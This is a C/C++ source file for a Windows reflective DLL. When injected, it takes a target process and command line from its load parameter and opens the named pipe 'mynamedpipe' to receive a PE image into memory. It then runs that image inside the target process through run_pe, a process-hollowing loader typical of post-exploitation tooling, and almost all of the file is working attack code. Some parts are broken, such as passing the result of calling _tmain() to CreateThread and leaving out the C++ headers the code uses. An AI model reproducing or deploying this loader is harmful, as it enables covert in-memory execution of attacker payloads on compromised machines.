#include "ReflectiveLoader.h"
#include <stdio.h>
#include <tchar.h>
#include <strsafe.h>
#include <stdlib.h>
#include "peconv.h"
#include "run_pe.h"

extern HINSTANCE hAppInstance;
#define PIPE_TIMEOUT 5000
#define BUFSIZE 4096

int size;
ULONG recv_total = 0;
UCHAR* cmdLine;
UCHAR* target;
UCHAR* raw;
UCHAR* temp;
HANDLE processHandle;
HANDLE remoteThread;
PVOID remoteBuffer;
typedef struct
{
    OVERLAPPED oOverlap;
    HANDLE hPipeInst;
    TCHAR chRequest[BUFSIZE];
    DWORD cbRead;
    TCHAR chReply[BUFSIZE];
    DWORD cbToWrite;
} PIPEINST, * LPPIPEINST;

VOID DisconnectAndClose(LPPIPEINST);
BOOL CreateAndConnectInstance(LPOVERLAPPED);
BOOL ConnectToNewClient(HANDLE, LPOVERLAPPED);

VOID WINAPI CompletedWriteRoutine(DWORD, DWORD, LPOVERLAPPED);
VOID WINAPI CompletedReadRoutine(DWORD, DWORD, LPOVERLAPPED);
HANDLE hPipe;

int _tmain(VOID)
{
    HANDLE hConnectEvent;
    OVERLAPPED oConnect;
    LPPIPEINST lpPipeInst;
    DWORD dwWait, cbRet;
    BOOL fSuccess, fPendingIO;

    temp = (UCHAR*)VirtualAlloc(NULL, 0x00400000, MEM_COMMIT, PAGE_READWRITE);
    raw = temp;
    if (temp == NULL)
    {
        return -1;
    }
    // Create one event object for the connect operation. 

    hConnectEvent = CreateEvent(
        NULL,    // default security attribute
        TRUE,    // manual reset event 
        TRUE,    // initial state = signaled 
        NULL);   // unnamed event object 

    if (hConnectEvent == NULL)
    {
        printf("CreateEvent failed with %d.\n", GetLastError());
        return 0;
    }

    oConnect.hEvent = hConnectEvent;

    // Call a subroutine to create one instance, and wait for 
    // the client to connect. 

    fPendingIO = CreateAndConnectInstance(&oConnect);

    while (1)
    {
        // Wait for a client to connect, or for a read or write 
        // operation to be completed, which causes a completion 
        // routine to be queued for execution. 

        dwWait = WaitForSingleObjectEx(
            hConnectEvent,  // event object to wait for 
            INFINITE,       // waits indefinitely 
            TRUE);          // alertable wait enabled 

        switch (dwWait)
        {
            // The wait conditions are satisfied by a completed connect 
            // operation. 
        case 0:
            // If an operation is pending, get the result of the 
            // connect operation. 

            if (fPendingIO)
            {
                fSuccess = GetOverlappedResult(
                    hPipe,     // pipe handle 
                    &oConnect, // OVERLAPPED structure 
                    &cbRet,    // bytes transferred 
                    FALSE);    // does not wait 
                if (!fSuccess)
                {
                    printf("ConnectNamedPipe (%d)\n", GetLastError());
                    return 0;
                }
            }

            // Allocate storage for this instance. 

            lpPipeInst = (LPPIPEINST)GlobalAlloc(
                GPTR, sizeof(PIPEINST));
            if (lpPipeInst == NULL)
            {
                printf("GlobalAlloc failed (%d)\n", GetLastError());
                return 0;
            }

            lpPipeInst->hPipeInst = hPipe;

            // Start the read operation for this client. 
            // Note that this same routine is later used as a 
            // completion routine after a write operation. 

            lpPipeInst->cbToWrite = 0;
            CompletedWriteRoutine(0, 0, (LPOVERLAPPED)lpPipeInst);

            // Create new pipe instance for the next client. 

            fPendingIO = CreateAndConnectInstance(
                &oConnect);
            break;

            // The wait is satisfied by a completed read or write 
            // operation. This allows the system to execute the 
            // completion routine. 

        case WAIT_IO_COMPLETION:
            break;

            // An error occurred in the wait function. 

        default:
        {
            printf("WaitForSingleObjectEx (%d)\n", GetLastError());
            return 0;
        }
        }
    }
    return 0;
}

// CompletedWriteRoutine(DWORD, DWORD, LPOVERLAPPED) 
// This routine is called as a completion routine after writing to 
// the pipe, or when a new client has connected to a pipe instance.
// It starts another read operation. 

VOID WINAPI CompletedWriteRoutine(DWORD dwErr, DWORD cbWritten,
    LPOVERLAPPED lpOverLap)
{
    LPPIPEINST lpPipeInst;
    BOOL fRead = FALSE;

    // lpOverlap points to storage for this instance. 

    lpPipeInst = (LPPIPEINST)lpOverLap;

    // The write operation has finished, so read the next request (if 
    // there is no error). 

    if ((dwErr == 0) && (cbWritten == lpPipeInst->cbToWrite))
        fRead = ReadFileEx(
            lpPipeInst->hPipeInst,
            lpPipeInst->chRequest,
            BUFSIZE * sizeof(TCHAR),
            (LPOVERLAPPED)lpPipeInst,
            (LPOVERLAPPED_COMPLETION_ROUTINE)CompletedReadRoutine);

    // Disconnect if an error occurred. 

    if (!fRead)
        DisconnectAndClose(lpPipeInst);
}

// CompletedReadRoutine(DWORD, DWORD, LPOVERLAPPED) 
// This routine is called as an I/O completion routine after reading 
// a request from the client. It gets data and writes it to the pipe. 

VOID WINAPI CompletedReadRoutine(DWORD dwErr, DWORD cbBytesRead,
    LPOVERLAPPED lpOverLap)
{
    LPPIPEINST lpPipeInst;
    BOOL fWrite = FALSE;

    // lpOverlap points to storage for this instance. 
    // lpOverlap points to storage for this instance. 

    lpPipeInst = (LPPIPEINST)lpOverLap;

    // The read operation has finished, so write a response (if no 
    // error occurred). 

    if ((dwErr == 0) && (cbBytesRead != 0))
    {
        recv_total += cbBytesRead;
        memcpy(temp, lpPipeInst->chRequest, cbBytesRead);
        temp += cbBytesRead;
        if (recv_total == size)
        {
            size_t v_size = 0;
            printf("[+]loader recv all %02d bytes\r\n", recv_total);
            printf("[+]Target: %s \r\n", target);
            printf("[+]cmdLine: %s \r\n", cmdLine);
            run_pe(raw, recv_total + 1, v_size, (char*)target, (char*)cmdLine);
            DisconnectNamedPipe(hPipe);

        }

        fWrite = ReadFileEx(
            lpPipeInst->hPipeInst,
            lpPipeInst->chRequest,
            BUFSIZE * sizeof(TCHAR),
            (LPOVERLAPPED)lpPipeInst,
            (LPOVERLAPPED_COMPLETION_ROUTINE)CompletedReadRoutine);
    }

    // Disconnect if an error occurred. 

    if (!fWrite)
        DisconnectAndClose(lpPipeInst);
}

// DisconnectAndClose(LPPIPEINST) 
// This routine is called when an error occurs or the client closes 
// its handle to the pipe. 

VOID DisconnectAndClose(LPPIPEINST lpPipeInst)
{
    // Disconnect the pipe instance. 

    if (!DisconnectNamedPipe(lpPipeInst->hPipeInst))
    {
        printf("DisconnectNamedPipe failed with %d.\n", GetLastError());
    }

    // Close the handle to the pipe instance. 

    CloseHandle(lpPipeInst->hPipeInst);

    // Release the storage for the pipe instance. 

    if (lpPipeInst != NULL)
        GlobalFree(lpPipeInst);
}

// CreateAndConnectInstance(LPOVERLAPPED) 
// This function creates a pipe instance and connects to the client. 
// It returns TRUE if the connect operation is pending, and FALSE if 
// the connection has been completed. 

BOOL CreateAndConnectInstance(LPOVERLAPPED lpoOverlap)
{
    LPTSTR lpszPipename = TEXT("\\\\.\\pipe\\mynamedpipe");

    hPipe = CreateNamedPipe(
        lpszPipename,             // pipe name 
        PIPE_ACCESS_DUPLEX |      // read/write access 
        FILE_FLAG_OVERLAPPED,     // overlapped mode 
        PIPE_TYPE_MESSAGE |       // message-type pipe 
        PIPE_READMODE_MESSAGE |   // message read mode 
        PIPE_WAIT,                // blocking mode 
        PIPE_UNLIMITED_INSTANCES, // unlimited instances 
        BUFSIZE * sizeof(TCHAR),    // output buffer size 
        BUFSIZE * sizeof(TCHAR),    // input buffer size 
        PIPE_TIMEOUT,             // client time-out 
        NULL);                    // default security attributes
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        printf("CreateNamedPipe failed with %d.\n", GetLastError());
        return 0;
    }
    /*
    else
    {
        printf("[+] Create Pipe Success\n");
        printf("[+] Waiting Connection...\n");
    }
    */

    // Call a subroutine to connect to the new client. 

    return ConnectToNewClient(hPipe, lpoOverlap);
}

BOOL ConnectToNewClient(HANDLE hPipe, LPOVERLAPPED lpo)
{
    BOOL fConnected, fPendingIO = FALSE;

    // Start an overlapped connection for this pipe instance. 
    fConnected = ConnectNamedPipe(hPipe, lpo);

    // Overlapped ConnectNamedPipe should return zero. 
    if (fConnected)
    {
        printf("ConnectNamedPipe failed with %d.\n", GetLastError());
        return 0;
    }

    switch (GetLastError())
    {
        // The overlapped connection in progress. 
    case ERROR_IO_PENDING:
        fPendingIO = TRUE;
        break;

        // Client is already connected, so signal an event. 

    case ERROR_PIPE_CONNECTED:
        if (SetEvent(lpo->hEvent))
            break;

        // If an error occurs during the connect operation... 
    default:
    {
        printf("ConnectNamedPipe failed with %d.\n", GetLastError());
        return 0;
    }
    }
    return fPendingIO;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
    BOOL bReturnValue = TRUE;
    switch (dwReason)
    {
    case DLL_QUERY_HMODULE:
        if (lpReserved != NULL)
            *(HMODULE*)lpReserved = hAppInstance;
        break;
    case DLL_PROCESS_ATTACH:
        hAppInstance = hinstDLL;
        if (lpReserved != NULL)
        {
            LPPIPEINST lpPipeInst;
            std::string arg;
            std::stringstream ss((char*)lpReserved);
            std::string cmdLine_ = (char*)lpReserved;
            std::vector<std::string> args;
            while (ss >> arg) {
                args.push_back(arg);
            }
            size_t found_argv = cmdLine_.find("-p");
            std::string argv = cmdLine_.substr(found_argv + 2, cmdLine_.length());
            std::string cmdLine__ = args[2] + argv;
            size = std::stoi(args[0]);
            target = (UCHAR*)args[2].c_str();
            cmdLine = (UCHAR*)cmdLine__.c_str();
            CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)_tmain(), NULL, NULL, NULL);
        }
        else
        {
            printf("no parameter\n");
            return FALSE;
        }
        fflush(stdout);
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return bReturnValue;
}